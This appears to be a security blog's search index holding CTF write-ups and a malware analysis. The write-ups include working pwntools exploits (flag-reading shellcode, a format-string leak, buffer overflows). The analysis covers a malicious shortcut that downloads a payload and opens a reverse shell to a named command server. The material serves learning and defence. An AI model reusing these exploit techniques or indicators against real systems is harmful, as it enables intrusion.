"date": "2022-12-02 00:00:00 +0800", "snippet": "Using strings.exe was able to findout its dotnet binary . Opening in dnspyx86 (32-bit binary). After navigating to main funcion we can see that form function is being called.using System;using System.Windows.Forms;namespace Challenge{\tinternal static class Program\t{\t\tprivate static void Main()\t\t{\t\t\tApplication.EnableVisualStyles();\t\t\tApplication.SetCompatibleTextRenderingDefault(false);\t\t\tApplication.Run(new Form1());\t\t}\t}}public Form1()\t\t{\t\t\tthis.InitializeComponent();\t\t}\t\tprivate void Form1_Load(object sender, EventArgs e)\t\t{\t\t}\t\tprivate void label1_Click(object sender, EventArgs e)\t\t{\t\t}\t\tprivate void button1_Click(object sender, EventArgs e)\t\t{\t\t\ttry\t\t\t{\t\t\t\tstring text = this.textBox1.Text;\t\t\t\tint[] array = new int[]\t\t\t\t{\t\t\t\t\t0,\t\t\t\t\t70,\t\t\t\t\t0,\t\t\t\t\t77,\t\t\t\t\t0,\t\t\t\t\t67,\t\t\t\t\t0,\t\t\t\t\t68,\t\t\t\t\t0,\t\t\t\t\t127,\t\t\t\t\t0,\t\t\t\t\t91,\t\t\t\t\t0,\t\t\t\t\t89,\t\t\t\t\t0,\t\t\t\t\t45,\t\t\t\t\t0,\t\t\t\t\t87,\t\t\t\t\t0,\t\t\t\t\t86,\t\t\t\t\t0,\t\t\t\t\t85,\t\t\t\t\t0,\t\t\t\t\t63,\t\t\t\t\t0,\t\t\t\t\t120,\t\t\t\t\t0,\t\t\t\t\t96,\t\t\t\t\t0,\t\t\t\t\t62,\t\t\t\t\t0,\t\t\t\t\t58,\t\t\t\t\t0,\t\t\t\t\t118,\t\t\t\t\t0,\t\t\t\t\t34,\t\t\t\t\t0,\t\t\t\t\t38,\t\t\t\t\t0,\t\t\t\t\t97,\t\t\t\t\t0,\t\t\t\t\t75,\t\t\t\t\t0,\t\t\t\t\t74,\t\t\t\t\t0,\t\t\t\t\t73,\t\t\t\t\t0,\t\t\t\t\t61,\t\t\t\t\t0,\t\t\t\t\t71,\t\t\t\t\t0,\t\t\t\t\t63,\t\t\t\t\t0,\t\t\t\t\t103\t\t\t\t};\t\t\t\tchar[] array2 = text.ToCharArray();\t\t\t\tbyte[] array3 = new byte[text.Length * 2];\t\t\t\tfor (int i = 0; i &lt; text.Length; i++)\t\t\t\t{\t\t\t\t\tint num = Convert.ToInt32(array2[i]);\t\t\t\t\tarray3[i * 2 + 1] = (byte)((num ^ i) &amp; 255);\t\t\t\t\tif (array[i * 2 + 1] != (int)array3[i * 2 + 1])\t\t\t\t\t{\t\t\t\t\t\tMessageBox.Show(\"Unvalid Password\");\t\t\t\t\t\treturn;\t\t\t\t\t}\t\t\t\t}\t\t\t\tMessageBox.Show(string.Format(\"Nice Work\", Array.Empty&lt;object&gt;()));\t\t\t}\t\t\tcatch (Exception ex)\t\t\t{\t\t\t\tMessageBox.Show(ex.Message);\t\t\t}\t\t}solution#!/usr/bin/python3a=[0,70,0,77,0,67,0,68,0,127,0,91,0,89,0,45,0,87,0,86,0,85,0,63,0,120,0,96,0,62,0,58,0,118,0,34,0,38,0,97,0,75,0,74,0,73,0,61,0,71,0,63,0,103]flag=bytearray(27)for i in range(27):\tcompare=a[i * 2 + 1]\tfor num in range(256):\t\tif compare==((num ^ i )&amp;255):\t\t\tflag[i]=num\t\t\tbreak\t\t\tprint(flag)" }, { "title": "Encryptor hackathon lhr Qualifier 2022", "url": "/posts/encryptor_hackathon_lhr_qualifying_2022/", "categories": "Reversing, amd64, ctf", "tags": "", "date": "2022-12-02 00:00:00 +0800", "snippet": "After Opening Binary in ghidra get to know that it‚Äôs C++ Binary. Converted it into python to get clear insight as to what binary is doing.#!/usr/bin/python3def second_algo(data): local_data=bytearray(1) local_data=data local_data = local_data ^ (local_data&gt;&gt;1) local_data = local_data ^ (local_data&gt;&gt;2) local_data = local_data ^ (local_data&gt;&gt;3) local_data = local_data ^ (local_data&gt;&gt;7) return local_datadef first_algo(data): local_data = bytearray(len(data)) for i in range(len(data)): if (i % 2) == 0 : local_data[i]=ord(data[i])+3 else: local_data[i]=ord(data[i])+23 local_data.reverse() local_data_1 = bytearray(4) key=\"toka\" for i in range(4): if (i%2)==0: local_data_1[i]=ord(key[i]) - 3 else: local_data_1[i]=ord(key[i]) + 3 return local_data+local_data_1print(\"Please input your input\")input_user=input()x = first_algo(input_user)y = bytearray(len(x))y = xfor i in range(len(x)): if i &gt; 0: y[i]=y[i-1] ^ y[i] y[i]=second_algo(y[i]) print(y.hex())we can see that it is taking input and then passing it to the first algo which is converting characters into hex then if the loop variable is even added 3 and if the loop variable is odd it adds 23 then reverse the array and concat ‚Äútoka‚Äù but after encrypting it. for which the even word is added 3 and odd 3 is subtracted.then the string is passed to the second algo which except the array‚Äôs first value xor it with the previous value and then saves it after that char is xor with itself shifted bits values which in first is 1 then 2 then 3 and lastly 7.Solution :#!/usr/bin/python3from pwn import *enc = \"472d630655246b1c5f207019473d611d47306d\"enc_flag = ['0x47', '0x2d', '0x63', '0x06', '0x55', '0x24', '0x6b', '0x1c', '0x5f', '0x20', '0x70', '0x19', '0x47', '0x3d', '0x61', '0x1d', '0x47', '0x30', '0x6d',]flag=bytearray(19)def second_algo(data): local_data=bytearray(1) local_data=data local_data = local_data ^ (local_data&gt;&gt;1) local_data = local_data ^ (local_data&gt;&gt;2) local_data = local_data ^ (local_data&gt;&gt;3) local_data = local_data ^ (local_data&gt;&gt;7) return local_datafor i in range(19): for z in range(256): y = bytearray(19) y = flag y[i]=z if i &gt; 0: y[i]=y[i-1] ^ y[i] y[i]=second_algo(y[i]) if y[i] == int(enc_flag[i],16): print(f\"i:{i} char:{chr(z)}\") breakflag=bytearray(b\"oxqfpfuzdjdfvbbqrhd\")[0:15][::-1] def first_algo_d(data): local_data = bytearray(len(data)) local_data=data for i in range(len(data)): print(local_data[i]) if (i%2) == 0: local_data[i]=local_data[i]-3 else: local_data[i]=local_data[i]-23 return local_dataflag=first_algo_d(flag)print(flag)The encrypted flag was converted into a hex value. Right-bit shift values are lost so recovering is impossible I Bruteforce it word by word and then reversed the first algorithm to get the Flag." }, { "title": "Hack The Boo pwn.pumpkin 2022", "url": "/posts/Pwn-pumpkin_HackTheBoo_2022/", "categories": "Pwn, amd64, ctf", "tags": "", "date": "2022-10-28 00:00:00 +0800", "snippet": "Purpose : Get The Flagchallenge** main **void main(void){ int iVar1; size_t input_len_int; long in_FS_OFFSET; ulong local_int; undefined8 input_user_string; undefined4 local_17; undefined2 local_13; undefined local_11; undefined8 canary; canary = *(undefined8 *)(in_FS_OFFSET + 0x28); setup(); input_user_string = 0; local_17 = 0; local_13 = 0; local_11 = 0; write(1, \"\\nFirst of all, in order to proceed, we need you to whisper the secret passphrase provided only to naughty kids: \" ,112); read(0,&amp;input_user_string,14); local_int = 0; while( true ) { input_len_int = strlen((char *)&amp;input_user_string); if (input_len_int &lt;= local_int) break; if (*(char *)((long)&amp;input_user_string + local_int) == '\\n') { *(undefined *)((long)&amp;input_user_string + local_int) = 0; } local_int = local_int + 1; } iVar1 = strncmp((char *)&amp;input_user_string,\"pumpk1ngRulez\",0xd); if (iVar1 == 0) { king(); } else { write(1,\"\\nYou seem too kind for the Pumpking to help you.. I\\'m sorry!\\n\\n\",0x3e); } /* WARNING: Subroutine does not return */ exit(0x16);}** king **void king(void){ long in_FS_OFFSET; undefined8 local_a8; undefined8 local_a0; undefined8 local_98; undefined8 local_90; undefined8 local_88; undefined8 local_80; undefined8 local_78; undefined8 local_70; undefined8 local_68; undefined8 local_60; undefined8 local_58; undefined8 local_50; undefined8 local_48; undefined8 local_40; undefined8 local_38; undefined8 local_30; undefined8 local_28; undefined8 local_20; undefined4 local_18; undefined2 local_14; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); write(1, \"\\n[Pumpkgin]: Welcome naughty kid! This time of the year, I will make your wish come true! Wish for everything, even for tha flag!\\n\\n&gt;&gt; \" ,0x88); local_a8 = 0; local_a0 = 0; local_98 = 0; local_90 = 0; local_88 = 0; local_80 = 0; local_78 = 0; local_70 = 0; local_68 = 0; local_60 = 0; local_58 = 0; local_50 = 0; local_48 = 0; local_40 = 0; local_38 = 0; local_30 = 0; local_28 = 0; local_20 = 0; local_18 = 0; local_14 = 0; read(0,&amp;local_a8,0x95); (*(code *)&amp;local_a8)(); if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return;}Solutionwrite this code to read and print flag from file for verification and same time used code disassemble for shell coding#include&lt;stdio.h&gt; #include&lt;fcntl.h&gt; #include&lt;errno.h&gt; #include &lt;stdio.h&gt;int main (){\tchar buf[30]=\" \";\tint fd;\tfd = openat( AT_FDCWD ,\"flag.txt\", O_RDONLY);\t\tread(fd, &amp;buf ,30);\twrite(1, &amp;buf ,30);\treturn 0;}objdump -d main -M intel ./binor we can use gdb to dump#!/usr/bin/python3from pwn import *import struct# Allows you to switch between local/GDB/remote from terminaldef start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # ('server', 'port') return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw)# Specify GDB script here (breakpoints etc)gdbscript = '''break *king+261continue'''.format(**locals())exe = './pumpking'; elf = context.binary = ELF(exe, checksec=False);exe_rop = ROP(elf,checksec=False)libc = elf.libc ; libc_rop = ROP(libc,checksec=False)io = start()io.sendlineafter(b\"First of all, in order to proceed, we need you to whisper the secret passphrase provided only to naughty kids: \",b\"pumpk1ngRulez\")payload = asm(\"\"\"push 1dec byte ptr [rsp]mov rax, 0x7478742e67616c66push raxpush SYS_openat /* 2 */pop raxmov rsi, rspxor rdx, rdx /* O_RDONLY */mov rdi, 0xffffff9c syscallmov rdi,raxlea rcx,[rbp-0x10]mov rsi,rcxmov rdx,70mov rax,0 /* read syscall number */syscallmov rdi,1lea rcx,[rbp-0x10]mov rsi,rcxmov rdx,70 mov rax,1 /* write syscall number */syscall\"\"\")io.sendlineafter(b\"&gt;&gt;\",payload)print(io.recvline())io.close()" }, { "title": "Hack The Boo pwn.Entity 2022", "url": "/posts/Pwn-entity_HackTheBoo_2022/", "categories": "Pwn, amd64, ctf", "tags": "", "date": "2022-10-28 00:00:00 +0800", "snippet": "Purpose : Get The FlagChallenge#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;static union { unsigned long long integer; char string[8];} DataStore;typedef enum { STORE_GET, STORE_SET, FLAG} action_t;typedef enum { INTEGER, STRING} field_t;typedef struct { action_t act; field_t field;} menu_t;menu_t menu() { menu_t res = { 0 }; char buf[32] = { 0 }; printf(\"\\n(T)ry to turn it off\\n(R)un\\n(C)ry\\n\\n&gt;&gt; \"); fgets(buf, sizeof(buf), stdin); buf[strcspn(buf, \"\\n\")] = 0; switch (buf[0]) { case 'T': res.act = STORE_SET; break; case 'R': res.act = STORE_GET; break; case 'C': res.act = FLAG; return res; default: puts(\"\\nWhat's this nonsense?!\"); exit(-1); } printf(\"\\nThis does not seem to work.. (L)ie down or (S)cream\\n\\n&gt;&gt; \"); fgets(buf, sizeof(buf), stdin); buf[strcspn(buf, \"\\n\")] = 0; switch (buf[0]) { case 'L': res.field = INTEGER; break; case 'S': res.field = STRING; break; default: printf(\"\\nYou are doomed!\\n\"); exit(-1); } return res;}void set_field(field_t f) { char buf[32] = {0}; printf(\"\\nMaybe try a ritual?\\n\\n&gt;&gt; \"); fgets(buf, sizeof(buf), stdin); switch (f) { case INTEGER: sscanf(buf, \"%llu\", &amp;DataStore.integer); if (DataStore.integer == 13371337) { puts(\"\\nWhat's this nonsense?!\"); exit(-1); } break; case STRING: memcpy(DataStore.string, buf, sizeof(DataStore.string)); break; }}void get_field(field_t f) { printf(\"\\nAnything else to try?\\n\\n&gt;&gt; \"); switch (f) { case INTEGER: printf(\"%llu\\n\", DataStore.integer); break; case STRING: printf(\"%.8s\\n\", DataStore.string); break; }}void get_flag() { if (DataStore.integer == 13371337) { system(\"cat flag.txt\"); exit(0); } else { puts(\"\\nSorry, this will not work!\"); }}int main() { setvbuf(stdout, NULL, _IONBF, 0); bzero(&amp;DataStore, sizeof(DataStore)); printf(\"\\nSomething strange is coming out of the TV..\\n\"); while (1) { menu_t result = menu(); switch (result.act) { case STORE_SET: set_field(result.field); break case STORE_GET: get_field(result.field); break; case FLAG: get_flag(); break; } }}Solution#!/usr/bin/python3from pwn import *import struct# Allows you to switch between local/GDB/remote from terminaldef start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # ('server', 'port') return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw)# Specify GDB script here (breakpoints etc)gdbscript = '''break *get_flag+11continue'''.format(**locals())exe = './entity'; elf = context.binary = ELF(exe, checksec=False);exe_rop = ROP(elf,checksec=False)io = start()io.sendlineafter(b\"&gt;&gt;\",b\"T\")io.sendlineafter(b\"&gt;&gt;\",b\"S\")io.sendlineafter(b\"&gt;&gt;\",p64(0xcc07c9))io.sendlineafter(b\"&gt;&gt;\",b\"C\")print(io.recvline())io.close()" }, { "title": "Malicious Zip", "url": "/posts/09cc7d0af801e5a3bebaa46a5b61bcc4eb133e2fe5159c65d47073c6a8163d80/", "categories": "Malware, zip, win", "tags": "", "date": "2022-09-01 00:00:00 +0800", "snippet": "Purpose : Analyzing The Malware BehaviourSuspicious rar contains 3 files 2 are cleared ¬†and 1 (file).lnk is malicious {Deduce after investigation }. lets start investigation .(58ec917b5d2e14846f5a7948b7d9cd19)Upon clicking (file).lnk, execute code from this URL (hXXp://av.msdefender.xyz/f)from the code below we can see a file is being fetched from URL and then saving it to ‚ÄúC:\\ Users\\ public\\ a.exe‚Äù and then get executed.Taking sha256 sum and putting in virustotal no result foundPutting in pe studio get some info first of all its 32 bit and .NET binary (yahoo ican get code to read rather than assembly its just faster :) ) and timestamp is a nonocompiled in the future wow time travel is at work here XDDoing floss on it immediately cert pop-ups some sort of encrypted communication is in place.let‚Äôs dig deeper opening it in dnspsy c2 server string ‚Äúnews.services-ms.info‚Äù and ‚Äúcmd.exe‚Äù is in base64 (just my habit of going for base64 first )two variable defined 1 integer and one char array (spoiler alert its certificate )To start the process variables are set up from the look of it cmd.exe is being spawned there is no visual of opening cmd.exe. ¬†Program.CmdOutputDataHandler will be discussed later down and then programs sleep for ¬†5000 secondsCreating a string variable then resolving the domain name and putting it into a variable. Creating an encrypted connection to the given IP (46.30.188.175) and port (54289). The certificate which was provided in a char arrayAfter the connection is established¬†sleep for 1000 seconds.Create a variable string that stores the received msg.If receive string is ‚Äúexit‚Äù kill itself.If receive string is ‚Äú‚ÄìSUICIDE‚Äù. It changes int ‚Äúnum‚Äù from zero to 100 then terminates. (i am really confused y making 2 things make do one thing )If the string is ‚ÄúACKNOWLEDGMENT‚Äù then the reverse shell¬†is given to the author.¬†The procedure is pretty simple stdin stdout and stderr of¬†the ‚Äúcmd.exe‚Äù process is buffer and then passed to the c2 server in encrypted form.Not going over exception cases its logging errors (but not sending them toc2 sever its odd ).CMDOUTPUTDATAHAndler as the name suggests is taking cmd.exe output andwriting to a network stream.Network connections to the above IP and port as found during the investigation.IOC :09cc7d0af801e5a3bebaa46a5b61bcc4eb133e2fe5159c65d47073c6a8163d80ee2c4814e7f65fcf4c3f1f81bba41098d759def9073c88cc6d9927cfc312903e" }, { "title": "Format pcc.nccs_final 2022", "url": "/posts/Format_pcc.nccs_2022/", "categories": "Pwn, i386, ctf", "tags": "", "date": "2022-08-08 00:00:00 +0800", "snippet": "Purpose : Get The FlagChecking binary security measures.Source Code is given. Reading through it we can see that flag is loaded and saved to the flag variable on the stack.Pointer to flag variable is given to us. Later it takes input that is vulnerable to format string. We have to just pass the pointer of flag char given by us and use ‚Äú%s‚Äù to print it#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char* argv) { setbuf(stdout, NULL); setbuf(stdin, NULL); FILE* fptr = fopen(\"flag.txt\", \"r\"); char flag[50]; if (fptr == NULL) { printf(\"\\nError reading flag from the file. Please contact TheFlash2k...\\n&gt; exit(-1); } fscanf(fptr, \"%s\", flag); fclose(fptr); printf(\"Address of Flag: %x\\n\", &amp;flag); const int SIZE = 50; char name[SIZE]; bzero(name, 0x00); printf(\"Please enter your name: \"); fgets(name, SIZE, stdin); printf(\"Welcome, %s\\n\", name); printf(\"Here's some messages that were left for you: \"); printf(name); printf(\"\\n\"); return 0;}Now it‚Äôs time to exploit this binary.#!/usr/bin/python3from pwn import *import structdef start(argv=[], *a, **kw): if args.GDB: return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: return remote(sys.argv[1], sys.argv[2], *a, **kw) else: return process([exe] + argv, *a, **kw)exe = './format'; elf = context.binary = ELF(exe, checksec=False);io = start()io.recvuntil(b\": \")leak_add = int(io.recvline().strip(b\"\\n\"),16)payload = b\"\"payload += p32(leak_add)payload += b\"%4$s\"io.sendlineafter(b\"Please enter your name:\",payload)io.recvuntil(b\"you: \")print(io.recvline().strip(b\"\\n\")[4:])io.close()" }, { "title": "Bof pcc.nccs_final 2022", "url": "/posts/Bof_pcc.nccs_2022/", "categories": "Pwn, i386, ctf", "tags": "", "date": "2022-08-08 00:00:00 +0800", "snippet": "Purpose : Get The FlagChecking binary security measures.Source Code is given. Reading through it we can see that it is checking if the argument passed to binary is equal to 10. If the condition is met will copy the 5th argv to a stack of 10 bytes without checking input which creates a stack-based buffer overflow. Using This vuln be redirected code to strcpp function. now have to modify _var to 24415 to print the flag which is present on the stack.#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;void strcpp() {\tvolatile int _var = 25;\tchar local_buffer[10];\tprintf(\"I really thought you wouldn't find this :(\\n\");\tprintf(\"Well, you still need to one more thing before going for the flag\\n&gt;&gt; \");\tgets(local_buffer);\tif(_var == 24415) {\t\tprintf(\"\\nYou really are pretty good at this. Here's the flag: \");\t\tchar flag[30];\t\tFILE* fptr = fopen(\"flag.txt\", \"r\");\t\tif (fptr == NULL) {\t\t\tprintf(\"\\nError reading flag from the file. Please contact TheFlash2k...\\n\");\t\t\texit(-1);\t\t}\t\tfscanf(fptr, \"%s\", flag);\t\tprintf(\"%s\\n\", flag);\t\tfclose(fptr);\t\texit(0);\t}\texit(1);}int main(int argc, char* argv[]) {\tsetbuf(stdin, NULL);\tsetbuf(stdout, NULL);\tchar buffer[50];\tif(argc == 10) {\t\tstrcpy(buffer, argv[5]);\t}\treturn 0;}Now it‚Äôs time to exploit this binary.#!/usr/bin/python3from pwn import *import structdef start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # ('server', 'port') return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw)exe = './bof'; elf = context.binary = ELF(exe, checksec=False);exe_rop = ROP(elf,checksec=False)io = start([\"A\",\"A\",\"A\",\"A\",b\"A\"*58+p32(elf.functions.strcpp.address),\"A\",\"A\",\"A\",\"A\"])payload = b\"B\"*10 + p32(0x5f5f)io.sendlineafter(b\"&gt;&gt;\",payload)io.interactive()" }, { "title": "Backk pcc.nccs.final 2022", "url": "/posts/Backk_pcc.nccs_2022/", "categories": "Pwn, i386, ctf", "tags": "", "date": "2022-08-08 00:00:00 +0800", "snippet": "Purpose : Get ShellChecking binary security measures.Source Code is given. Reading through it we can see the option2 registration function is vulnerable. It uses the gets function which will not see how much value is being fed to it we use it to perform a stack-based buffer overflow.#include &lt;stdio.h&gt;#include &lt;string.h&gt;#define SIZE 64void banner() {\tprintf(\"‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä\\n\");\tprintf(\"‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°¥‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä\\n\");\tprintf(\"‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£º‚†É‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä\\n\");\tprintf(\"‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£Ä‚£§‚†§‚†∂‚†∂‚†∂‚†∂‚†∂‚†∂‚¢Ä‚£æ‚°è‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä\\n\");\tprintf(\"‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£Ä‚°¥‚†û‚†ã‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢†‚£ø‚°ø‚†Ä‚†ô‚†≥‚¢¶‚£Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä\\n\");\tprintf(\"‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£†‚†û‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£∞‚£ø‚£ø‚†É‚†Ä‚†Ä‚†Ä‚†Ä‚†â‚†≥‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä\\n\");\tprintf(\"‚†Ä‚†Ä‚†Ä‚¢†‚†û‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£¥‚£ø‚£ø‚£á‚£†‚£¥‚°∂‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†≥‚£Ñ‚†Ä‚†Ä‚†Ä\\n\");\tprintf(\"‚†Ä‚†Ä‚£∞‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£º‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†É‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ô‚£Ü‚†Ä‚†Ä\\n\");\tprintf(\"‚†Ä‚£∞‚†á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ò‚£Ü‚†Ä\\n\");\tprintf(\"‚¢†‚°è‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£†‚£ø‚£ø‚¢ø‚£ø‚£ø‚£ø‚£ø‚°ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢π‚°Ñ\\n\");\tprintf(\"‚¢∏‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†â‚†Ä‚¢†‚£ø‚£ø‚£ø‚£ø‚°ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚°á\\n\");\tprintf(\"‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£ø‚£ø‚£ø‚£ø‚£ø‚†É‚†Ä‚£Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø\\n\");\tprintf(\"‚¢ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£æ‚£ø‚£ø‚£ø‚£ø‚£∑‚£æ‚°ø‚†É‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°ø\\n\");\tprintf(\"‚¢∏‚°Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢†‚°á\\n\");\tprintf(\"‚†à‚£ß‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£º‚†Å\\n\");\tprintf(\"‚†Ä‚†ò‚£á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£º‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£∏‚†É‚†Ä\\n\");\tprintf(\"‚†Ä‚†Ä‚†ò‚¢ß‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ò‚†ã‚†â‚£º‚£ø‚£ø‚°ø‚†É‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°¥‚†É‚†Ä‚†Ä\\n\");\tprintf(\"‚†Ä‚†Ä‚†Ä‚†à‚†≥‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∞‚£ø‚£ø‚°ü‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£†‚†û‚†Å‚†Ä‚†Ä‚†Ä\\n\");\tprintf(\"‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†≥‚£§‚°Ä‚†Ä‚†Ä‚¢Ä‚£ø‚£ø‚†è‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£§‚†û‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä\\n\");\tprintf(\"‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ô‚†≥‚†Ç‚£æ‚£ø‚†É‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£Ä‚£†‚°¥‚†û‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä\\n\");\tprintf(\"‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£∏‚°ø‚†Å‚†â‚†õ‚†õ‚†õ‚†õ‚†õ‚†õ‚†â‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä\\n\");\tprintf(\"‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∞‚†ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä\\n\");\tprintf(\"‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚†è‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä\\n\");\tprintf(\"‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä - TheFlash2k‚†Ä‚†Ä\\n\");}void local_flush(void) { int c; while((c = getchar()) != '\\n' &amp;&amp; c != EOF);}void secure_input(int* var) {\tfflush(stdin);\tscanf(\"%d\", var);\tlocal_flush();}void login() {\tchar userName[SIZE];\tprintf(\"\\n\\nWelcome to the login screen. Enter your username to continue\\n&gt;&gt; \");\tfgets(userName, SIZE, 